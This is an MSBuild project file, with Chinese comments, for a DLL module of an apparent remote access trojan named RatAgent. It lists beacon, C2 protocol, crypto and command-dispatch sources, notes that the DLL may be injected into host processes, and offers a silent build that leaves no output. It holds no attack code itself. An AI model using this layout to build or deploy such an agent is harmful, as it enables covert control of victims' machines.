<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{EC689B57-7058-42C1-99D0-A092E3FDCDA3}</ProjectGuid>
    <RootNamespace>RatAgentSys</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <!-- 与 EXE 工程共享同一批 core 源码；只多出 agent_dll.cpp（导出/DllMain）。
       两种配置都使用静态 CRT（/MT）：DLL 可能被注入到没有对应 CRT 的宿主进程，
       依赖 /MD 的机器上不会存在调试版运行库。 -->
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
    <TargetName>RatAgent.sys</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <TargetName>RatAgent.sys</TargetName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <!-- 中间目录按工程名分开：见 RatAgent.sys.exe.vcxproj 里的同一段说明 -->
  <PropertyGroup>
    <IntDir>$(ProjectName)\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <!-- 诊断/落盘开关（可命令行覆盖）：默认 1/1 = 既有行为。见 core/agent_debug.h
       例：-p:RatAgentDebug=0                      → 静默（无输出、无文件）
           -p:RatAgentDebug=0 -p:RatAgentPersistId=1 → 静默但保留稳定身份（只落 id） -->
  <PropertyGroup Label="RatAgentSwitches">
    <RatAgentDebug Condition="'$(RatAgentDebug)' == ''">1</RatAgentDebug>
    <RatAgentPersistId Condition="'$(RatAgentPersistId)' == ''">$(RatAgentDebug)</RatAgentPersistId>
    <!-- 模块标识（见 core/module_id.h）：决定命名空间与 C2 侧标签/能力位。
         新模块工程应把这两个值**写死成自己的**，别依赖默认值（默认是 full）。 -->
    <RatAgentModuleId Condition="'$(RatAgentModuleId)' == ''">sys</RatAgentModuleId>
    <RatAgentModuleCaps Condition="'$(RatAgentModuleCaps)' == ''">(c2::kCapSys)</RatAgentModuleCaps>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
      <!-- 模块工程自己的 caps.cpp 不在 core 目录里，需要把 core 加进头文件搜索路径 -->
      <AdditionalIncludeDirectories>$(ProjectDir)core;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <Optimization>Disabled</Optimization>
      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
      <!-- 与 EXE 工程默认输出到同一目录：分离 PDB/ILK，避免互相覆盖 -->
      <ProgramDataBaseFileName>$(OutDir)RatAgent.sys.dll.pdb</ProgramDataBaseFileName>
      <TreatWarningAsError>false</TreatWarningAsError>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <ProgramDatabaseFile>$(OutDir)RatAgent.sys.dll.pdb</ProgramDatabaseFile>
      <ImportLibrary>$(OutDir)RatAgent.sys.lib</ImportLibrary>
      <LinkIncremental>false</LinkIncremental>
      <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
      <!-- 模块工程自己的 caps.cpp 不在 core 目录里，需要把 core 加进头文件搜索路径 -->
      <AdditionalIncludeDirectories>$(ProjectDir)core;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <ProgramDataBaseFileName>$(OutDir)RatAgent.sys.dll.pdb</ProgramDataBaseFileName>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <ProgramDatabaseFile>$(OutDir)RatAgent.sys.dll.pdb</ProgramDatabaseFile>
      <ImportLibrary>$(OutDir)RatAgent.sys.lib</ImportLibrary>
      <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <!-- ================================================================================
       文件按"来源"分两个过滤器（VS 里就是两个文件夹，不再是平铺的一堆）：
         · core (shared) = 共享内核：同一个 core/ 被**每个模块**编译进去，
                           所以改它 = 改所有模块，必须保持能力无关（见 core/capability.h）
         · module (sys)  = 只有本模块才有的文件：新增能力放这里
       ================================================================================ -->
  <ItemGroup>
    <Filter Include="core (shared)">
      <UniqueIdentifier>{6F1B2A10-0001-4C3D-9E01-000000000001}</UniqueIdentifier>
    </Filter>
    <Filter Include="module (sys)">
      <UniqueIdentifier>{6F1B2A10-0002-4C3D-9E01-000000000002}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <!-- ［本模块自有］sys 模块只有能力清单 -->
    <ClCompile Include="caps_sys.cpp">
      <Filter>module (sys)</Filter>
    </ClCompile>
    <!-- ［共享内核］DLL 外壳 -->
    <ClCompile Include="core\agent_dll.cpp">
      <Filter>core (shared)</Filter>
    </ClCompile>
    <!-- ［共享内核］运行核心 + 通信 + 内置系统类指令 -->
    <ClCompile Include="core\agent_runtime.cpp">
      <Filter>core (shared)</Filter>
    </ClCompile>
    <ClCompile Include="core\capability.cpp">
      <Filter>core (shared)</Filter>
    </ClCompile>
    <ClCompile Include="core\protocol.cpp">
      <Filter>core (shared)</Filter>
    </ClCompile>
    <ClCompile Include="core\crypto.cpp">
      <Filter>core (shared)</Filter>
    </ClCompile>
    <ClCompile Include="core\net.cpp">
      <Filter>core (shared)</Filter>
    </ClCompile>
    <ClCompile Include="core\session.cpp">
      <Filter>core (shared)</Filter>
    </ClCompile>
    <ClCompile Include="core\cmd_dispatch.cpp">
      <Filter>core (shared)</Filter>
    </ClCompile>
    <ClCompile Include="core\beacon.cpp">
      <Filter>core (shared)</Filter>
    </ClCompile>
    <!-- ［共享内核］头文件 -->
    <ClInclude Include="core\capability.h">
      <Filter>core (shared)</Filter>
    </ClInclude>
    <ClInclude Include="core\module_id.h">
      <Filter>core (shared)</Filter>
    </ClInclude>
    <ClInclude Include="core\agent_debug.h">
      <Filter>core (shared)</Filter>
    </ClInclude>
    <ClInclude Include="core\agent_runtime.h">
      <Filter>core (shared)</Filter>
    </ClInclude>
    <ClInclude Include="core\protocol.h">
      <Filter>core (shared)</Filter>
    </ClInclude>
    <ClInclude Include="core\crypto.h">
      <Filter>core (shared)</Filter>
    </ClInclude>
    <ClInclude Include="core\net.h">
      <Filter>core (shared)</Filter>
    </ClInclude>
    <ClInclude Include="core\session.h">
      <Filter>core (shared)</Filter>
    </ClInclude>
    <ClInclude Include="core\cmd_dispatch.h">
      <Filter>core (shared)</Filter>
    </ClInclude>
    <ClInclude Include="core\beacon.h">
      <Filter>core (shared)</Filter>
    </ClInclude>
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
